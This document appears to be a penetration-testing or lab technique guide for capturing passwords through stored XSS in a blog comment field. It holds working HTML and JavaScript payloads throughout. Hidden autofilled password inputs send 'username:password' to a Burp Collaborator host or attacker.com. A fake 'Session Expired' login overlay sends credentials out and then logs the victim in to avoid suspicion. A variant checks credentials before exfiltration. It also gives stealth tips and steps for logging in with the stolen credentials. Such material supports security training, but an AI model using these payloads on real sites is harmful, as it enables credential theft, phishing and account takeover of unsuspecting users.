# XSS — Password Capture

## When this applies

The target hosts an XSS sink in a context where the victim's browser autofills credentials (e.g., comment area on a domain that has saved passwords), or where a fake login overlay can be injected to harvest credentials.

## Technique

Two patterns:
1. **Autofill abuse** — inject hidden `<input type=password>` near a `username` field; the browser's password manager autofills, the `onchange` handler exfiltrates.
2. **Fake login overlay** — replace the page with a phishing form that captures credentials and (optionally) re-submits them to the real login endpoint to avoid suspicion.

## Steps

1. **Access Burp Collaborator**:
   - Get your unique Collaborator subdomain

2. **Craft Password Capture Payload**:
   ```html
   <input name=username id=username>
   <input type=password name=password onchange="
   if(this.value.length)
       fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
           method:'POST',
           mode: 'no-cors',
           body:username.value+':'+this.value
       });
   ">
   ```

3. **Post Comment**:
   - Navigate to blog post
   - Inject payload in comment field
   - Submit comment

4. **Monitor Collaborator**:
   - Poll Burp Collaborator
   - Check POST request body for credentials
   - Format: `username:password`

5. **Login with Stolen Credentials**:
   - Use captured username and password
   - Access victim's account

### How Autofill Exploitation Works

1. **Browser Detection**:
   - Browser's password manager scans for input fields
   - Detects `type="password"` and nearby username field
   - Automatically fills in saved credentials

2. **Event Trigger**:
   - `onchange` event fires when field value changes
   - Autofill triggers change event
   - Credentials immediately exfiltrated

3. **Stealth**:
   - Inputs can be hidden with CSS
   - User may not notice fields
   - Execution happens in background

### Hidden Input Technique
```html
<style>
.stealth { position: absolute; left: -9999px; }
</style>
<input name=username class=stealth>
<input type=password name=password class=stealth onchange="
    if(this.value.length) {
        fetch('https://attacker.com/creds', {
            method: 'POST',
            mode: 'no-cors',
            body: username.value + ':' + this.value
        });
    }
">
```

### Fake Login Form Technique

**Complete Page Overlay**:
```html
<style>
body { display: none; }
#fake-login {
    display: block;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: white;
    z-index: 9999;
    text-align: center;
    padding-top: 100px;
}
</style>
<div id="fake-login">
    <h2>Session Expired</h2>
    <p>Please login again to continue</p>
    <form id="phish">
        <input type="text" name="username" placeholder="Username" required><br><br>
        <input type="password" name="password" placeholder="Password" required><br><br>
        <input type="submit" value="Login">
    </form>
</div>
<script>
document.getElementById('phish').onsubmit = function(e) {
    e.preventDefault();
    var user = document.querySelector('[name=username]').value;
    var pass = document.querySelector('[name=password]').value;

    // Send to attacker
    fetch('https://attacker.com/steal', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({username: user, password: pass})
    });

    // Actually log them in (less suspicious)
    fetch('/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({username: user, password: pass})
    }).then(() => location.reload());
};
</script>
```

### Enhanced Techniques

**Credential Validation Before Exfiltration**:
```javascript
document.getElementById('phish').onsubmit = function(e) {
    e.preventDefault();
    var user = document.querySelector('[name=username]').value;
    var pass = document.querySelector('[name=password]').value;

    // Validate credentials first
    fetch('/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({username: user, password: pass})
    }).then(response => {
        if (response.ok) {
            // Only exfiltrate valid credentials
            fetch('https://attacker.com/steal', {
                method: 'POST',
                mode: 'no-cors',
                body: user + ':' + pass
            });
            location.reload();
        } else {
            alert('Invalid credentials. Please try again.');
        }
    });
};
```

## Verifying success

- Burp Collaborator records POST with `username:password` body.
- Captured credentials authenticate successfully against the real login endpoint.
- For autofill: browser console shows the password field's value populated without user typing.

## Common pitfalls

1. **Not hiding input fields** — visible password fields tip off the victim.
2. **Missing onchange handler** — autofill fires no event, no exfiltration.
3. **Not testing autofill behavior** — some browsers / password managers require additional attributes (`autocomplete=username`).
4. **Forgetting to check Collaborator** — credentials arrive but go unnoticed.
5. **Using GET instead of POST for exfiltration** — long passwords with special chars truncate or break URLs.

## Tools

- **Burp Collaborator** — exfiltration endpoint
- **Browser password manager** (Chrome / Firefox / 1Password / etc.) — needed to test autofill flow
- **DevTools → Application → Storage** — verify saved credentials before testing
